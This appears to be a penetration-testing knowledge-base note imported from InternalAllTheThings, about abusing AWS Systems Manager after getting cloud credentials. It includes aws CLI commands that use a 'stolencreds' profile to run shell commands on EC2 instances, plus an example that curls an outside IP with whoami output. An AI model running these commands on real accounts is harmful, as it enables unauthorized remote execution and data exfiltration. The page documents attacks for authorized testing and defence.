---
title: AWS - Service - SSM
type: technique
tags: [aws, cloud, credentials, reference-import, ssm]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# AWS - Service - SSM

## What it is

:warning: The ssm-user account is not removed from the system when SSM Agent is uninstalled.

## How it works

AWS Systems Manager (SSM) Agent runs on EC2 instances and allows command execution via `ssm:SendCommand` without needing SSH or RDP access; attackers with this IAM permission can execute arbitrary commands on any managed instance in the account. SSM Parameter Store stores secrets (API keys, database passwords) that applications retrieve at runtime; an attacker with `ssm:GetParameter` or `ssm:GetParameters` can read these secrets in plaintext. The `ssm-user` account created by the SSM Agent persists after the agent is uninstalled, providing a persistent local account on the instance.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Command execution

:warning: The ssm-user account is not removed from the system when SSM Agent is uninstalled.

SSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs):

* Windows Server 2008-2012 R2 AMIs published in November 2016 or later
* Windows Server 2016 and 2019
* Amazon Linux
* Amazon Linux 2
* Ubuntu Server 16.04
* Ubuntu Server 18.04
* Amazon ECS-Optimized

```powershell
$ aws ssm describe-instance-information --profile stolencreds --region eu-west-1  
$ aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds
$ aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}" --profile stolencreds

e.g:
$ aws ssm send-command --instance-ids "i-05b████████adaa" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1
```

## References

* [What is AWS Systems Manager? - AWS](https://docs.aws.amazon.com/systems-manager/latest/userguide/what-is-systems-manager.html)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[radare2]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
